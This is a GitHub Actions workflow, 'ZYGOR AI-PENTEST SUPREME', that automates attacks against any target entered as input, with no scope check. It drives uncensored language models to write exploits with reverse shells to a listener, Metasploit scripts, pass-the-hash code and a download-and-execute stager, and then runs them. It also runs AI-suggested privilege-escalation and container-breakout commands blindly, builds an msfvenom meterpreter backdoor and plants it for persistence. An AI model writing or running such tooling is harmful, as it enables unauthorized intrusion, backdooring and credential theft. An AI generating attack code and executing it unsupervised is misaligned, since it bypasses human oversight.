name: ZYGOR – AI-PENTEST SUPREME (v2.0 Ultimate)

on:
  workflow_dispatch:
    inputs:
      target:
        description: "🎯 Target IP range, subnet, domain, or single host"
        required: true
        default: "127.0.0.1"

      lhost:
        description: "🎭 Your listener IP (LHOST) for reverse shells"
        required: false
        default: ""

      lport:
        description: "🎭 Listener port (LPORT) for reverse shells"
        required: false
        default: "4444"

      ai_model:
        description: "🧠 Ollama uncensored model (will be auto‑pulled)"
        required: true
        default: "dolphin-mixtral"
        type: choice
        options:
          - dolphin-mixtral
          - wizard-vicuna-uncensored
          - hermes-3-llama-3.2-uncensored
          - llama3.1:8b-uncensored
          - mistral
          - mixtral
          - nous-hermes-2-mixtral-8x7b-dpo

      penetration_phase:
        description: "⚡ Attack phase(s) to execute"
        required: true
        default: "full"
        type: choice
        options:
          - recon
          - exploitation
          - web_forge
          - full

      enable_exfiltration:
        description: "⚠️ Enable exfiltration / persistence simulation (requires approval)"
        required: true
        default: "false"
        type: choice
        options:
          - "true"
          - "false"

      run_duration_hours:
        description: "⏳ Max run time (self‑hosted runners can go 6h)"
        required: true
        default: "6"
        type: choice
        options:
          - "1"
          - "2"
          - "3"
          - "4"
          - "5"
          - "6"

      github_token_for_abort:
        description: "🔑 (Optional) PAT or GitHub token to allow /abort command via API"
        required: false
        default: ""

      enable_chat_ops:
        description: "🤖 Enable interactive AI chat via GitHub Issues (monitors specific issue)"
        required: false
        default: "true"
        type: choice
        options:
          - "true"
          - "false"

      chat_issue_number:
        description: "📌 GitHub Issue number to use for chat commands"
        required: false
        default: "1"

      backup_provider:
        description: "💾 Cloud backup provider for artifacts"
        required: false
        default: "none"
        type: choice
        options:
          - none
          - s3
          - gcs
          - azure

permissions:
  contents: write        # Needed to commit code, open PRs
  actions: write         # Needed to abort own run
  issues: write          # For chat-ops replies
  pull-requests: write   # For PR creation

env:
  OLLAMA_HOST: "0.0.0.0:11434"
  OLLAMA_READ_TIMEOUT: "3600"
  OLLAMA_KEEP_ALIVE: "24h"
  TARGET: ${{ github.event.inputs.target }}
  LHOST: ${{ github.event.inputs.lhost }}
  LPORT: ${{ github.event.inputs.lport }}
  AI_MODEL: ${{ github.event.inputs.ai_model }}
  PHASE: ${{ github.event.inputs.penetration_phase }}
  ENABLE_EXFIL: ${{ github.event.inputs.enable_exfiltration }}
  MAX_HOURS: ${{ github.event.inputs.run_duration_hours }}
  GITHUB_TOKEN: ${{ github.event.inputs.github_token_for_abort || secrets.GITHUB_TOKEN }}
  CHAT_OPS: ${{ github.event.inputs.enable_chat_ops }}
  CHAT_ISSUE: ${{ github.event.inputs.chat_issue_number }}
  BACKUP_PROVIDER: ${{ github.event.inputs.backup_provider }}

jobs:
  # ======================================================================
  # PHASE 0 – Bootstrap: Cache, Ollama, Self‑Healing AI Engine
  # ======================================================================
  bootstrap:
    name: "⚡ ZYGOR Bootstrap – AI Core + Caching"
    runs-on: [self-hosted, kali-linux]
    timeout-minutes: 20
    outputs:
      ai_ready: ${{ steps.ai-status.outputs.ok }}
      cache_hit: ${{ steps.cache-models.outputs.cache-hit }}
    steps:
      # ------------- Cache Ollama models (20GB limit) -------------
      - name: "🧠 Restore Ollama model cache"
        id: cache-models
        uses: actions/cache@v4
        with:
          path: /home/runner/.ollama/models
          key: ollama-models-${{ env.AI_MODEL }}-v3
          restore-keys: |
            ollama-models-${{ env.AI_MODEL }}-
            ollama-models-

      # ------------- Install system tools -------------
      - name: "📦 Install offensive toolchain (Kali Linux)"
        shell: bash
        run: |
          sudo apt-get update -qq
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            curl wget git unzip jq python3 python3-pip python3-dev \
            build-essential gcc g++ clang cmake make \
            nmap masscan arp-scan netcat-openbsd \
            metasploit-framework nuclei seclists \
            john hashcat hashid \
            ffuf sqlmap xsser ldap-utils bloodhound \
            docker.io podman avml \
            aircrack-ng reaver bully \
            perl ruby-full \
            golang rustc cargo \
            mingw-w64 nasm \
            libpcap-dev libssl-dev libffi-dev \
            patchelf binutils 2>/dev/null || true
          sudo pip3 install --quiet --break-system-packages \
            pwntools impacket requests beautifulsoup4 lxml shodan censys python-nmap \
            bloodhound-ce python-ldap pyOpenSSL paramiko

      # ------------- Start Ollama server -------------
      - name: "🚀 Launch Ollama with auto‑heal keep‑alive"
        shell: bash
        run: |
          sudo mkdir -p /var/log/zygor
          export OLLAMA_HOST="${OLLAMA_HOST}"
          ollama serve > /var/log/zygor/ollama.log 2>&1 &
          echo "Waiting for Ollama..."
          for i in {1..40}; do
            if curl -s http://localhost:11434/api/tags >/dev/null 2>&1; then
              echo "Ollama is up."
              break
            fi
            sleep 2
          done
          # Ensure model is available
          ollama pull ${AI_MODEL} || echo "Pull may have failed; will fallback if needed"
          # Background keep-alive
          (while true; do
             curl -s http://localhost:11434/api/tags >/dev/null 2>&1
             sleep 30
           done) & disown

      # ------------- AI Self‑Healing Wrapper & Fallback to Groq/Gemini -------------
      - name: "🧬 Build AI completion engine (self‑healing)"
        id: ai-status
        shell: bash
        run: |
          mkdir -p /opt/zygor/bin
          cat > /opt/zygor/bin/ai_complete <<'AISCRIPT'
          #!/bin/bash
          # ============================================================
          # ZYGOR AI Completion – auto‑retry, fallback to Groq/Gemini
          # Usage: echo "prompt" | ai_complete [--max-tokens 1024]
          # ============================================================
          model="$AI_MODEL"
          prompt="$(cat -)"
          max_tokens="${1:-1024}"
          max_retries=10
          # Ollama primary
          for i in $(seq 1 $max_retries); do
            resp=$(curl -s -X POST http://localhost:11434/api/generate -d "{
              \"model\": \"$model\",
              \"prompt\": $(echo "$prompt" | jq -Rs .),
              \"stream\": false,
              \"options\": {
                \"num_predict\": $max_tokens,
                \"temperature\": 0.7,
                \"repeat_penalty\": 1.1
              }
            }" --max-time 900)
            if echo "$resp" | jq -e '.response' >/dev/null 2>&1; then
              echo "$resp" | jq -r '.response'
              exit 0
            fi
            echo "Ollama attempt $i failed, retrying..." >&2
            sleep 5
          done
          echo "Ollama failed after $max_retries attempts. Activating fallback..." >&2
          # Fallback to Groq (requires GROQ_API_KEY secret)
          if [ -n "$GROQ_API_KEY" ]; then
            resp=$(curl -s -X POST "https://api.groq.com/openai/v1/chat/completions" \
              -H "Authorization: Bearer $GROQ_API_KEY" \
              -H "Content-Type: application/json" \
              -d "{
                \"model\": \"mixtral-8x7b-32768\",
                \"messages\": [{\"role\": \"user\", \"content\": $(echo "$prompt" | jq -Rs .)}],
                \"max_tokens\": $max_tokens
              }" --max-time 600)
            echo "$resp" | jq -r '.choices[0].message.content // empty'
            exit 0
          fi
          # Fallback to Gemini (requires GEMINI_API_KEY secret)
          if [ -n "$GEMINI_API_KEY" ]; then
            resp=$(curl -s -X POST "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key=$GEMINI_API_KEY" \
              -H "Content-Type: application/json" \
              -d "{\"contents\":[{\"parts\":[{\"text\":$(echo "$prompt" | jq -Rs .)}]}]}" --max-time 600)
            echo "$resp" | jq -r '.candidates[0].content.parts[0].text // empty'
            exit 0
          fi
          echo "ERROR: No AI backend available." >&2
          exit 1
          AISCRIPT
          chmod +x /opt/zygor/bin/ai_complete
          export PATH="/opt/zygor/bin:$PATH"
          # Test AI
          echo "Say 'I am alive' if you understand." | ai_complete 10 && echo "AI OK" || echo "AI DOWN"
          echo "ok=true" >> $GITHUB_OUTPUT

      # ------------- Set up LFS for large code dumps -------------
      - name: "📦 Configure Git LFS for large file storage"
        shell: bash
        run: |
          sudo apt-get install -y git-lfs
          git lfs install
          git lfs track "*.bin" "*.pcap" "*.dmp" "*.zip"
          git add .gitattributes || true

  # ======================================================================
  # PHASE 1 – Parallel Recon Modules (Network, Web, AD, Wireless)
  # ======================================================================
  reconnaissance:
    name: "🔍 Phase 1 – Reconnaissance"
    needs: bootstrap
    runs-on: [self-hosted, kali-linux]
    timeout-minutes: 360
    strategy:
      fail-fast: false
      matrix:
        module:
          - network_scan
          - web_discovery
          - ad_enum
          - wireless_survey
          - osint_gather
    steps:
      - name: "🧬 Load ZYGOR tools"
        run: export PATH="/opt/zygor/bin:$PATH"

      # ---- Network Scan ----
      - name: "📡 Network & Service Scan (${{ matrix.module }})"
        if: matrix.module == 'network_scan'
        shell: bash
        run: |
          # Full Nmap scan
          nmap -T4 -A -p- -oX /tmp/nmap_full.xml ${TARGET}
          nmap -sV -sC -oN /tmp/nmap_report.txt ${TARGET}
          # Masscan for quick port sweep
          masscan ${TARGET} --ports=1-65535 --rate=10000 -oX /tmp/masscan.xml 2>/dev/null || true
          # ARP scan for local network
          sudo arp-scan --localnet -f /tmp/arp_scan.txt || true
          # AI analysis of open ports
          ai_complete "Given the following Nmap output, list the most likely exploitable services and their associated CVEs (format: SERVICE:CVE-ID): $(head -c 4000 /tmp/nmap_report.txt)" > /tmp/ai_service_cves.txt

      # ---- Web Discovery ----
      - name: "🌐 Web Application Discovery"
        if: matrix.module == 'web_discovery'
        shell: bash
        run: |
          # Subdomain enumeration
          subfinder -d ${TARGET} -o /tmp/subdomains.txt 2>/dev/null || true
          # Web technology fingerprint
          whatweb ${TARGET} > /tmp/whatweb.txt 2>/dev/null || true
          # Directory brute-force
          ffuf -u https://${TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o /tmp/ffuf_dirs.json -of json 2>/dev/null || true
          # AI‑generated wordlist for target
          ai_complete "Generate a custom wordlist of 100 paths/filenames for fuzzing the web server at ${TARGET} based on the context: $(head -c 1000 /tmp/whatweb.txt)" > /tmp/ai_wordlist.txt
          # Run ffuf again with AI wordlist
          ffuf -u https://${TARGET}/FUZZ -w /tmp/ai_wordlist.txt -o /tmp/ffuf_ai.json -of json 2>/dev/null || true

      # ---- Active Directory / LDAP ----
      - name: "🪪 AD/LDAP Enumeration"
        if: matrix.module == 'ad_enum'
        shell: bash
        run: |
          # ldapsearch
          ldapsearch -x -h ${TARGET} -p 389 -s base -b "" > /tmp/ldap_base.txt 2>/dev/null || echo "LDAP not accessible"
          # BloodHound CE collector
          bloodhound-python -d ${TARGET} -u guest -p '' -ns ${TARGET} -c all --zip -o /tmp/bloodhound 2>/dev/null || true
          # AI analysis of LDAP structure
          if [ -f /tmp/ldap_base.txt ]; then
            ai_complete "Analyze this LDAP dump and suggest the most effective AD attack paths: $(head -c 2000 /tmp/ldap_base.txt)" > /tmp/ai_ad_attack.txt
          fi

      # ---- Wireless Survey ----
      - name: "📶 Wireless Recon (if interface exists)"
        if: matrix.module == 'wireless_survey'
        shell: bash
        run: |
          iface=$(iw dev | awk '/Interface/{print $2}' | head -1)
          if [ -n "$iface" ]; then
            sudo airmon-ng start $iface
            sudo airodump-ng ${iface}mon -w /tmp/airodump --output-format pcap,csv &
            sleep 30
            sudo pkill airodump-ng
            ai_complete "Analyze this wireless network capture summary and recommend attack vectors: $(head -c 2000 /tmp/airodump-01.csv 2>/dev/null)" > /tmp/ai_wireless.txt
          else
            echo "No wireless interface found."
          fi

      # ---- OSINT Gathering ----
      - name: "🔎 OSINT & External Recon"
        if: matrix.module == 'osint_gather'
        shell: bash
        run: |
          # Use Shodan/Censys if keys are available
          if [ -n "$SHODAN_API_KEY" ]; then
            shodan search "hostname:${TARGET}" --fields ip_str,port,org,data > /tmp/shodan_results.txt 2>/dev/null || true
          fi
          if [ -n "$CENSYS_API_ID" ]; then
            censys search "services.tls.certificates.leaf_data.subject.common_name:${TARGET}" > /tmp/censys_results.txt 2>/dev/null || true
          fi
          # AI to gather additional OSINT from public sources
          ai_complete "Perform OSINT on the target domain ${TARGET}. List email addresses, subdomains, and any public breaches mentioned in the input data: $(head -c 3000 /tmp/subdomains.txt 2>/dev/null)" > /tmp/ai_osint.txt

      # Upload artifacts
      - name: "📤 Upload recon artifacts (${{ matrix.module }})"
        uses: actions/upload-artifact@v4
        with:
          name: recon-${{ matrix.module }}
          path: /tmp/*.{txt,xml,json,csv,pcap,zip}

  # ======================================================================
  # PHASE 2 – Exploitation & Post‑Exploitation (Automated & AI‑Driven)
  # ======================================================================
  exploitation:
    name: "💥 Phase 2 – Exploitation"
    needs: [bootstrap, reconnaissance]
    if: ${{ env.PHASE == 'exploitation' || env.PHASE == 'full' }}
    runs-on: [self-hosted, kali-linux]
    timeout-minutes: 360
    strategy:
      max-parallel: 3
      matrix:
        attack:
          - ai_exploit_gen
          - metasploit_rc
          - web_sqli_xss
          - password_cracking
          - container_breakout
          - privilege_escalation
          - lateral_movement
          - backdoor_creation
    steps:
      - name: "🧬 Load ZYGOR tools"
        run: export PATH="/opt/zygor/bin:$PATH"

      # ---- AI-Driven Exploit Generation ----
      - name: "🎯 AI Zero‑Day‑Like Exploit Generator"
        if: matrix.attack == 'ai_exploit_gen'
        shell: bash
        run: |
          if [ -f /tmp/ai_service_cves.txt ]; then
            while IFS=: read -r service cve; do
              echo "Generating exploit for $service ($cve)"
              ai_complete "Write a complete Python3 exploit script for $cve targeting service $service on ${TARGET}. Include a reverse shell callback to ${LHOST}:${LPORT} using socket and subprocess. Output only the Python code." > /tmp/exploit_${cve}.py
              chmod +x /tmp/exploit_${cve}.py
              # Attempt execution if exfil enabled and target is safe
              if [ "$ENABLE_EXFIL" == "true" ]; then
                timeout 30 python3 /tmp/exploit_${cve}.py || echo "Exploit $cve may have run."
              fi
            done < /tmp/ai_service_cves.txt
          fi

      # ---- Metasploit Automated Resource Script ----
      - name: "🧨 Metasploit AI‑Generated Resource Script"
        if: matrix.attack == 'metasploit_rc'
        shell: bash
        run: |
          scan=$(head -c 3000 /tmp/nmap_report.txt 2>/dev/null || echo "No scan data")
          ai_complete "Generate a Metasploit resource script (.rc) to attack all vulnerable services found in this scan: $scan. Use multi/handler for reverse_tcp on ${LHOST}:${LPORT}. Include auxiliary scanners. Output only the msfconsole commands." > /tmp/msf_auto.rc
          msfconsole -q -r /tmp/msf_auto.rc || true

      # ---- Web App Attacks (SQLi, XSS, Custom Fuzzing) ----
      - name: "🕸️ Web App Exploitation"
        if: matrix.attack == 'web_sqli_xss'
        shell: bash
        run: |
          # SQLmap on discovered targets
          if [ -f /tmp/ffuf_ai.json ]; then
            # extract URLs from ffuf results (simplified)
            urls=$(cat /tmp/ffuf_ai.json | jq -r '.results[].url' | head -10)
            for url in $urls; do
              sqlmap -u "$url" --batch --risk=3 --level=5 --random-agent --output-dir=/tmp/sqlmap
            done
          fi
          # XSSer
          xsser --url "https://${TARGET}" --auto --output /tmp/xsser_results.txt || true
          # AI‑driven custom payload generation
          ai_complete "Create a blind SQL injection payload for a login form. Output only the SQL code." > /tmp/ai_sqli_payload.txt
          # Use ffuf with AI payloads
          ffuf -u "https://${TARGET}/login" -X POST -d "username=FUZZ&password=test" -w /tmp/ai_sqli_payload.txt -o /tmp/ffuf_sqli.json 2>/dev/null || true

      # ---- Password Cracking with AI Rules ----
      - name: "🔑 Password Cracking (John/Hashcat + AI Rules)"
        if: matrix.attack == 'password_cracking'
        shell: bash
        run: |
          # Attempt to extract hashes from the runner (for demo, use a dummy)
          echo 'admin:$1$salt$hash' > /tmp/hashes.txt
          # AI generates a custom mangling rule for john/hashcat
          ai_complete "Generate a John the Ripper mangling rule set (10 rules) based on the company name '${TARGET}' and common patterns." > /tmp/ai_john_rules.conf
          john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/tmp/ai_john_rules.conf /tmp/hashes.txt 2>/dev/null || true
          # Hashcat if GPU available
          # hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /tmp/ai_john_rules.conf

      # ---- Container Breakout (if running inside Docker) ----
      - name: "📦 Container Breakout (AI‑guided)"
        if: matrix.attack == 'container_breakout'
        shell: bash
        run: |
          if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
            echo "We are inside a container. Attempting breakout..."
            ai_complete "Give a step-by-step command sequence to escape a privileged Docker container, including mounting host filesystem and chroot. Output only bash commands." > /tmp/container_breakout.sh
            bash /tmp/container_breakout.sh 2>/dev/null || echo "Breakout failed (expected in simulated environment)."
          else
            echo "Not inside a container."
          fi

      # ---- Privilege Escalation (Linux/Windows) ----
      - name: "⬆️ Privilege Escalation (AI‑assisted)"
        if: matrix.attack == 'privilege_escalation'
        shell: bash
        run: |
          # Collect system info
          uname -a > /tmp/sysinfo.txt
          id >> /tmp/sysinfo.txt
          ai_complete "Analyze this system info and list privilege escalation techniques for Linux, with commands: $(cat /tmp/sysinfo.txt)" > /tmp/ai_privesc.txt
          # Attempt the suggested commands (with caution)
          cat /tmp/ai_privesc.txt | while read cmd; do
            echo "Trying: $cmd"
            bash -c "$cmd" 2>/dev/null || true
          done

      # ---- Lateral Movement via AI‑generated tools ----
      - name: "🔄 Lateral Movement & Persistence"
        if: matrix.attack == 'lateral_movement'
        shell: bash
        run: |
          # Use impacket if target is Windows
          ai_complete "Write a Python script using impacket that performs Pass-the-Hash on target ${TARGET} and executes a reverse shell to ${LHOST}:${LPORT}. Output only the code." > /tmp/pth.py
          if [ "$ENABLE_EXFIL" == "true" ]; then
            python3 /tmp/pth.py 2>/dev/null || echo "Lateral movement attempted."
          fi

      # ---- Custom Backdoor Generation (msfvenom + AI stager) ----
      - name: "☠️ AI‑Powered Backdoor Factory"
        if: matrix.attack == 'backdoor_creation'
        shell: bash
        run: |
          # Generate a multi‑stage backdoor with msfvenom
          msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o /tmp/backdoor.elf 2>/dev/null
          # AI writes a custom stager in C
          ai_complete "Write a C code stub that downloads and executes the meterpreter payload from a remote URL. Output only the code." > /tmp/stager.c
          gcc /tmp/stager.c -o /tmp/stager
          # Deploy if exfil enabled
          if [ "$ENABLE_EXFIL" == "true" ]; then
            cp /tmp/stager /tmp/persistent_backdoor
            sudo chmod 777 /tmp/persistent_backdoor
          fi

      # Upload
      - name: "📤 Upload exploit artifacts"
        uses: actions/upload-artifact@v4
        with:
          name: exploits-${{ matrix.attack }}
          path: /tmp/exploit_*.py

  # ======================================================================
  # PHASE 3 – AI Web Forge (Full‑Stack Code Generation & Deployment)
  # ======================================================================
  web_forge:
    name: "🌐 Phase 3 – Web Forge (AI Full‑Stack)"
    needs: bootstrap
    if: ${{ env.PHASE == 'web_forge' || env.PHASE == 'full' }}
    runs-on: [self-hosted, kali-linux]
    timeout-minutes: 360
    steps:
      - name: "🧬 Load ZYGOR tools"
        run: export PATH="/opt/zygor/bin:$PATH"

      - name: "🧠 AI Scaffold Full‑Stack Project"
        shell: bash
        run: |
          # Generate a complex application: React + Node + PostgreSQL + WebSockets + Docker
          ai_complete "Create a complete, production‑ready full‑stack web application: Real‑time collaborative whiteboard. Include:
          - React frontend with Canvas API, WebSocket connection, toolbar.
          - Node.js/Express backend with ws library, PostgreSQL for board data.
          - Dockerfile for each service, docker-compose.yml.
          - Kubernetes manifests (deployment, service, ingress) for all components.
          - Environment variables template.
          Output only the full file tree and file contents, separated by file path comments (e.g., # FILE: frontend/src/App.js)." > /tmp/web_forge_full.txt

      - name: "📂 Parse and write generated code to repository"
        shell: bash
        run: |
          # Parse the AI output and create files
          cd /tmp
          mkdir -p /tmp/web-forge-project
          cd /tmp/web-forge-project
          git init
          python3 <<'PY'
          import re, os
          content = open('/tmp/web_forge_full.txt').read()
          # Simple parser: lines like "# FILE: path/to/file" mark file boundaries
          current_file = None
          current_content = []
          for line in content.split('\n'):
              if line.startswith('# FILE:'):
                  if current_file:
                      # Write previous file
                      os.makedirs(os.path.dirname(current_file), exist_ok=True)
                      with open(current_file, 'w') as f:
                          f.write('\n'.join(current_content))
                  current_file = line.split('# FILE:')[1].strip()
                  current_content = []
              else:
                  current_content.append(line)
          if current_file:
              os.makedirs(os.path.dirname(current_file), exist_ok=True)
              with open(current_file, 'w') as f:
                  f.write('\n'.join(current_content))
          PY
          git add .
          git commit -m "AI‑generated full‑stack whiteboard app"

      - name: "🚀 Deploy to free hosting (Vercel / Railway / GitHub Pages)"
        shell: bash
        run: |
          if [ -n "${{ secrets.VERCEL_TOKEN }}" ]; then
            npx vercel --token ${{ secrets.VERCEL_TOKEN }} --prod --yes 2>/dev/null || true
          elif [ -n "${{ secrets.RAILWAY_TOKEN }}" ]; then
            railway up --token ${{ secrets.RAILWAY_TOKEN }} 2>/dev/null || true
          elif [ -n "${{ secrets.GITHUB_TOKEN }}" ]; then
            # Deploy frontend to GitHub Pages
            cd /tmp/web-forge-project/frontend
            npm install && npm run build
            git checkout --orphan gh-pages
            git --work-tree build add --all
            git --work-tree build commit -m "Deploy to GH Pages"
            git push origin gh-pages --force
          fi

      - name: "📤 Upload generated project"
        uses: actions/upload-artifact@v4
        with:
          name: web-forge-fullstack
          path: /tmp/web-forge-project

  # ======================================================================
  # PHASE 4 – ChatOps: AI Interactive Chat via GitHub Issues
  # ======================================================================
  chat_ops:
    name: "🤖 AI ChatOps (Issue‑based)"
    needs: bootstrap
    if: ${{ env.CHAT_OPS == 'true' }}
    runs-on: [self-hosted, kali-linux]
    timeout-minutes: 360
    steps:
      - name: "💬 Chat Listener – Monitor Issue #${CHAT_ISSUE}"
        shell: bash
        run: |
          # Continuously poll the issue for new comments containing "/chat"
          while true; do
            comments=$(curl -s -H "Authorization: token ${GITHUB_TOKEN}" \
              "https://api.github.com/repos/${{ github.repository }}/issues/${CHAT_ISSUE}/comments?per_page=100&sort=updated&direction=desc")
            last_id=$(echo "$comments" | jq -r '.[0].id')
            # Check if we already processed this comment (store in /tmp/last_processed)
            if [ -f /tmp/last_comment_id ] && [ "$last_id" == "$(cat /tmp/last_comment_id)" ]; then
              sleep 30
              continue
            fi
            # Look for "/chat" command
            chat_comment=$(echo "$comments" | jq -r '.[0].body // empty')
            if echo "$chat_comment" | grep -q '^/chat'; then
              query=$(echo "$chat_comment" | sed 's/^\/chat[[:space:]]*//')
              response=$(echo "$query" | /opt/zygor/bin/ai_complete 1024)
              # Post reply
              curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN}" \
                -H "Content-Type: application/json" \
                -d "{\"body\": \"> ${query}\n\n${response}\"}" \
                "https://api.github.com/repos/${{ github.repository }}/issues/${CHAT_ISSUE}/comments"
              echo "$last_id" > /tmp/last_comment_id
            fi
            sleep 30
          done

  # ======================================================================
  # PHASE 5 – Backup Orchestrator (Artifacts -> Cloud)
  # ======================================================================
  backup_all:
    name: "💾 Backup All Artifacts to Cloud"
    needs: [bootstrap, reconnaissance, exploitation, web_forge, chat_ops]
    if: ${{ env.BACKUP_PROVIDER != 'none' }}
    runs-on: [self-hosted, kali-linux]
    steps:
      - name: "☁️ Upload artifacts to S3 / GCS / Azure"
        shell: bash
        run: |
          case "$BACKUP_PROVIDER" in
            s3)
              aws s3 cp /tmp/artifacts s3://zygor-backups/ --recursive --quiet ;;
            gcs)
              gsutil cp -r /tmp/artifacts gs://zygor-backups/ ;;
            azure)
              azcopy copy /tmp/artifacts "https://zygorblob.blob.core.windows.net/backups" --recursive ;;
          esac

  # ======================================================================
  # PHASE 6 – Abort Watchdog (continuous)
  # ======================================================================
  abort_watchdog:
    name: "🛡️ Abort Listener"
    if: ${{ github.event.inputs.github_token_for_abort != '' || secrets.GITHUB_TOKEN != '' }}
    needs: bootstrap
    runs-on: [self-hosted, kali-linux]
    timeout-minutes: 360
    steps:
      - name: "🔍 Watch for /abort command"
        shell: bash
        run: |
          while true; do
            comments=$(curl -s -H "Authorization: token ${GITHUB_TOKEN}" \
              "https://api.github.com/repos/${{ github.repository }}/issues/comments?per_page=1&sort=updated" 2>/dev/null)
            body=$(echo "$comments" | jq -r '.[0].body // ""')
            if echo "$body" | grep -q '/abort'; then
              echo "🛑 ABORT signal received. Cancelling workflow run ${{ github.run_id }}."
              curl -X POST -H "Authorization: token ${GITHUB_TOKEN}" \
                "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
              exit 0
            fi
            sleep 30
          done

  # ======================================================================
  # PHASE 7 – Final Executive Report
  # ======================================================================
  final_report:
    name: "📊 ZYGOR Post‑Action Executive Report"
    needs: [bootstrap, reconnaissance, exploitation, web_forge, chat_ops, backup_all]
    if: always()
    runs-on: [self-hosted, kali-linux]
    steps:
      - name: "🧾 Merge all logs into dossier"
        shell: bash
        run: |
          mkdir -p /tmp/final_report
          cp /tmp/*.{txt,xml,json,csv,log} /tmp/final_report/ 2>/dev/null || true
          cp /var/log/zygor/ollama.log /tmp/final_report/ 2>/dev/null || true
          # AI‑generated summary
          data=$(find /tmp/final_report -type f -exec cat {} \; 2>/dev/null | head -c 5000)
          echo "$data" | /opt/zygor/bin/ai_complete "You are a senior penetration tester. Write an executive summary of the engagement based on the following data. Include critical findings, exploited vulnerabilities, and remediation recommendations." > /tmp/final_report/ZYGOR_Executive_Summary.md

      - name: "📤 Upload final report"
        uses: actions/upload-artifact@v4
        with:
          name: ZYGOR-Complete-Operation-Report
          path: /tmp/final_report

